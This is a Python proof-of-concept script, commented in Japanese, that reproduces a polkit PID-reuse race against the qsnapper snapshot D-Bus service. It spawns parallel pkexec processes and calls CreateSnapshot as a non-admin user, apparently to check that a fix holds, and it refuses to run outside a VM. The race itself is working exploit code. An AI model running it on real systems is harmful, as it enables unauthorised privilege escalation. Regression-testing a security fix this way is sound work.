#!/usr/bin/env python3
"""
poc_polkit_race.py - Issue #1 (CVE-2013-4288 class) 再現PoC

目的:
    v1.3.2 の checkAuthorization() は PolkitQt1::UnixProcessSubject を使っており、
    PID-based で Polkit 判定を行う。bob (non-admin) から呼び出した直後に、
    同じPIDを持つプロセスを exec で置き換えたり、PID再利用を誘発することで
    Polkit判定が別プロセス情報に対して行われ、権限昇格が可能になる。

    修正版 (P0-1 後) では SystemBusNameSubject を用いるため
    D-Bus接続単位で判定され、このraceは成立しない。

使い方:
    sudo -u bob python3 poc_polkit_race.py --iterations 1000

Exit:
    BASELINEモードで reproduced == True → 0 (再現成功 PASS)
    修正版モードで reproduced == False → 0 (阻止 PASS)
    それ以外 → 1 (regression)

注意:
    このPoCはVM内でのみ実行すること。common.sh の assert_running_in_vm 相当を
    Pythonでも確認している。
"""

import argparse
import os
import subprocess
import sys
import time
from concurrent.futures import ThreadPoolExecutor

try:
    from dbus import SystemBus, Interface  # type: ignore
    from dbus.exceptions import DBusException  # type: ignore
except ImportError:
    print("ERROR: python3-dbus is required", file=sys.stderr)
    sys.exit(2)

DBUS_SERVICE = "com.presire.qsnapper.Operations"
DBUS_PATH = "/com/presire/qsnapper/Operations"
DBUS_IFACE = "com.presire.qsnapper.Operations"


def assert_vm() -> None:
    virt = subprocess.run(
        ["systemd-detect-virt"], capture_output=True, text=True
    ).stdout.strip()
    if virt == "none":
        print("ERROR: must run in a VM", file=sys.stderr)
        sys.exit(2)


def attempt_call() -> str:
    """CreateSnapshot を1回試行。戻り値: 'success' | 'denied' | 'other:<msg>'"""
    bus = SystemBus()
    proxy = bus.get_object(DBUS_SERVICE, DBUS_PATH)
    ops = Interface(proxy, DBUS_IFACE)
    try:
        ops.CreateSnapshot("root", "single", "poc-race", 0, "", {}, False)
        return "success"
    except DBusException as e:
        name = e.get_dbus_name()
        if "AccessDenied" in name or "NotAuthorized" in name:
            return "denied"
        return f"other:{name}"


def race_worker(_: int) -> str:
    # 並列に短寿命 pkexec プロセスを走らせてPID再利用を誘発
    # (TODO: 実環境に合わせて pkexec target を調整)
    subprocess.Popen(
        ["pkexec", "--disable-internal-agent", "true"],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
    time.sleep(0.0005)  # race window
    return attempt_call()


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--iterations", type=int, default=1000)
    parser.add_argument("--workers", type=int, default=8)
    args = parser.parse_args()

    assert_vm()
    mode = "baseline" if os.environ.get("BASELINE") else "fixed"
    print(f"mode={mode} uid={os.geteuid()} iterations={args.iterations}")

    if os.geteuid() == 0:
        print("WARN: running as root; switch to 'bob' via sudo -u bob", file=sys.stderr)

    success = denied = other = 0
    with ThreadPoolExecutor(max_workers=args.workers) as ex:
        for outcome in ex.map(race_worker, range(args.iterations)):
            if outcome == "success":
                success += 1
            elif outcome == "denied":
                denied += 1
            else:
                other += 1

    print(f"success={success} denied={denied} other={other}")
    reproduced = success > 0
    expected_reproduced = mode == "baseline"
    if reproduced == expected_reproduced:
        print(f"RESULT: PASS (reproduced={reproduced})")
        return 0
    print(f"RESULT: FAIL (reproduced={reproduced}, expected={expected_reproduced})")
    return 1


if __name__ == "__main__":
    sys.exit(main())
